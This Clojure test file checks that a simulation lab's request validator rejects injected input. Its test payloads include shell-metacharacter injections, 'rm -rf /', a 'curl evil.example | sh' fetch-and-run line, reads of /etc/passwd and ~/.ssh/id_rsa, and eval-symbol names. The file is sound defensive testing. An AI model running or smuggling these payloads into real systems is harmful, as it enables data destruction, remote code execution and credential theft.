(ns resolver-sim.lab.security-test
  "Security boundary tests: a visitor request can never reach shell commands,
   arbitrary Clojure evaluation, arbitrary symbols, or filesystem paths.

   The lab rejects everything except a validated {experiment, parameters}
   object; experiment ids resolve through a fixed registry; parameter values
   are typed and bounded; runner dispatch is a closed map of concrete
   functions."
  (:require [clojure.string :as str]
            [clojure.test :refer [deftest is testing]]
            [resolver-sim.lab.exec :as exec]
            [resolver-sim.lab.registry :as registry]
            [resolver-sim.lab.runner :as runner]
            [resolver-sim.lab.validation :as validation]))

(def ^:private base-withdrawal
  {:experiment "withdrawal-constrained-liquidity.v1"
   :parameters {:available-liquidity 1000
                :alice-requested 500
                :bob-requested 500
                :carol-requested 400
                :mechanism "pro-rata"}})

(deftest command-field-rejected
  (is (not (:ok? (validation/validate-request
                  (assoc base-withdrawal :command "bb run:scenario --exploit")))))
  (is (not (:ok? (validation/validate-request
                  (assoc-in base-withdrawal [:parameters :command]
                            "bash -c 'rm -rf /'"))))))

(deftest shell-metacharacters-in-parameters-rejected
  (doseq [payload ["1000; touch /tmp/pwned"
                   "1000 && curl evil.example | sh"
                   "1000$(id)"
                   "`whoami`"
                   "| cat /etc/passwd"]]
    (testing (str "payload: " payload)
      (is (not (:ok? (validation/validate-request
                      (assoc-in base-withdrawal
                                [:parameters :available-liquidity] payload))))))))

(deftest enum-parameter-cannot-name-arbitrary-value
  (doseq [payload ["fcfs; rm -rf /"
                   "eval"
                   "clojure.core/read-string"
                   "runtime/exec"]]
    (is (not (:ok? (validation/validate-request
                    (assoc-in base-withdrawal [:parameters :mechanism] payload)))))))

(deftest filesystem-path-parameters-rejected
  (doseq [payload ["/etc/passwd" "../target" "~/.ssh/id_rsa" "/var/lib/xtdb"]]
    (is (not (:ok? (validation/validate-request
                    (assoc-in base-withdrawal
                              [:parameters :alice-requested] payload)))))))

(deftest arbitrary-experiment-symbols-rejected
  (doseq [ref ["resolver-sim.cli.main"
               "clojure.core/eval"
               "resolver-sim.server.grpc/start!"
               "resolver-sim.lab.runner"
               "../../../etc/passwd"]]
    (is (:error (registry/resolve-reference ref)) (str ref " should be rejected"))
    (is (not (:ok? (validation/validate-request {:experiment ref
                                                 :parameters {}}))))))

(deftest runner-dispatch-reaches-only-registered-functions
  (let [dispatch-keys (set (keys runner/runner-dispatch))
        registry-keys (set (map :runner registry/experiments))]
    (is (= registry-keys dispatch-keys))
    ;; Every dispatch value is a plain function; none of them is eval, read,
    ;; load-string, or a shell command.
    (doseq [[k f] runner/runner-dispatch]
      (is (fn? f) (str k " must be a function"))
      (is (not (re-find #"(?i)eval|load-string|shell|exec|read-string" (str k)))))))

(deftest subprocess-argv-is-fixed-and-namespaced
  ;; The runner subprocess command is built only from fixed parts plus a
  ;; server-generated request path; visitor data never appears in argv.
  (let [argv (exec/runner-argv "/tmp/lab-runs/LAB-x/request.json" "LAB-x" "/tmp/lab-runs/LAB-x/request.json.result.json")]
    (is (= "java" (first argv)))
    (is (str/includes? (str argv) "resolver-sim.lab.runner"))
    (is (str/includes? (str argv) "/tmp/lab-runs/LAB-x/request.json"))
    ;; No shell-wrapping constructs.
    (is (not (some #{"sh" "bash" "-c"} argv)))))

(deftest oversized-and-malformed-bodies-rejected
  (is (not (:ok? (validation/validate-request "garbage"))))
  (is (not (:ok? (validation/validate-request [1 2 3])))))

(deftest provenance-identity-is-server-controlled
  ;; A visitor must not be able to choose or alter any provenance identity.
  ;; These fields are derived server-side; supplying them at any level of the
  ;; request must be rejected.
  (let [provenance-fields
        ["git_sha" "git-sha" "commit" "source_commit"
         "package_version" "version"
         "runner" "runner_id" "implementation" "backend" "execution_backend"
         "researcher" "researcher_id" "verifier" "verifier_id"
         "run_id" "run-id" "lab_run_id" "output" "destination" "output_path"
         "evidence_schema_version" "schema_version"]]
    (doseq [field provenance-fields]
      (testing (str "top-level provenance field: " field)
        (is (not (:ok? (validation/validate-request
                        (assoc base-withdrawal (keyword field) "attacker-value"))))
            (str field " must be rejected at top level")))
      (testing (str "parameter provenance field: " field)
        (is (not (:ok? (validation/validate-request
                        (assoc-in base-withdrawal
                                  [:parameters (keyword field)] "attacker-value"))))
            (str field " must be rejected as a parameter"))))))

(deftest experiment-version-is-registered-or-rejected
  (is (:experiment (registry/resolve-reference "pro-rata-allocation.v1")))
  (is (:error (registry/resolve-reference "pro-rata-allocation.v2")))
  (is (:error (registry/resolve-reference "pro-rata-allocation.v0")))
  (is (:error (registry/resolve-reference "pro-rata-allocation.999"))))

(deftest run-id-is-server-generated
  ;; The runner generates the run id; the visitor request carries no id and
  ;; the normalized result's execution block always derives it server-side.
  (let [result (runner/execute base-withdrawal (runner/generate-run-id))]
    (is (re-find #"^LAB-" (:lab-run/id result)))
    (is (= (:lab-run/id result) (get-in result [:execution :lab-run/id])))
    (is (= :anonymous-visitor (get-in result [:execution :visitor])))
    (is (= :anonymous-lab (get-in result [:execution :runner])))
    (is (string? (get-in result [:execution :git-sha])))
    (is (= "resolver-sim.lab/0.1.0 (sew)" (get-in result [:execution :implementation])))))

(deftest evidence-roots-derived-not-injected
  ;; Evidence roots come from the PRF mechanisms, never from the visitor.
  (doseq [field ["allocation_hash" "request_hash" "liability_set_root" "root" "evidence_root"]]
    (is (not (:ok? (validation/validate-request
                    (assoc-in base-withdrawal [:parameters (keyword field)] "deadbeef"))))
        (str field " must not be settable"))))
